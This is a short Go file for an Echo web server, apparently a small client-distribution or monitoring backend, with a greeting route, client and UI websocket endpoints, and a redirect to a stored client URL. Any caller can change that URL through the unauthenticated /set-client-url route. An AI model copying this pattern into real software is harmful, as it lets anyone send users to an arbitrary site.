package main

import (
	"net/http"

	"github.com/labstack/echo/v4"
	"github.com/labstack/echo/v4/middleware"
)

func main() {
	e := echo.New()

	e.Use(middleware.Logger())
	e.Use(middleware.Recover())
	e.Use(middleware.CORS())
	e.Use(middleware.Secure())
	e.Use(middleware.RemoveTrailingSlash())

	e.GET("/", func(c echo.Context) error {
		return c.String(http.StatusOK, "BigBrother is watching you.")
	})

	clientUrl := ""

	e.GET("/get-client", func(c echo.Context) error {
		if clientUrl == "" {
			return c.NoContent(http.StatusNotFound)
		}

		return c.Redirect(http.StatusSeeOther, clientUrl)
	})

	e.POST("/set-client-url", func(c echo.Context) error {
		clientUrl = c.FormValue("url")
		return c.NoContent(http.StatusOK)
	})

	e.GET("/client-socket", clientSocket)
	e.GET("/ui-socket", uiSocket)

	e.Logger.Fatal(e.Start(":4479"))
}
